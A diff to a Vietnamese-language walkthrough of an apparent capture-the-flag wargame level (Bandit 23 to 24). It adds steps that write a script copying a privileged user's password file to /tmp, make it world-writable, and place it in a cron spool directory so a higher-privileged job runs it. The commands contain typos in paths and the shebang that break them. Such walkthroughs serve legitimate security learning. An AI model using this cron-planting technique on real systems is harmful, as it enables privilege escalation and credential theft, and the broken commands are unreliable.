@@ -25,6 +25,7 @@ LƯU Ý 2: Lưu ý rằng tập lệnh shell của bạn sẽ bị xóa sau khi 
 Cú pháp:
 ```
 mkdir [tuy_chọn] ten_thư_mục
+```
 ---
 
 
@@ -41,10 +42,36 @@ cat /usr/bin/cronjob_bandit24.sh
 - sau khi đọc tệp shell ta nhận được đoạn mã ngôn ngữ `bash` như sau:
 <img width="560" height="288" alt="image" src="https://github.com/user-attachments/assets/a209b67b-1a6a-4d65-b23a-1c2aa2881c36" />
 
-2.
+2. Tạo thư mục phụ để lưu mật khẩu
 
+```
+mkdir /tmp/savepass/
+```
+Sau đó:
+```
+nano sript.sh
+```
+- Tạo thư mục để lưu sript như sau: `#! bin/bash 
+                                      cat /ect/dandit_pass/bandit24 > /tmp/savepass/password.txt  `
 
+3. Kiểm tra quyền thực thi của file `sh` mới tạo
+
+```
+ls -l script.sh
+```
+Sau đó:
+
+```
+chmod 777 script.sh
+```
+- Cấp cho file có quyền đọc, ghi, và thực thi.
 ---
+
+4.Chuyển đoạn `script` vào đoạn script lớn
+
+```
+cp script.sh /var/spool/bandit24/foo
+```
 
 
 ## 🏁 Password
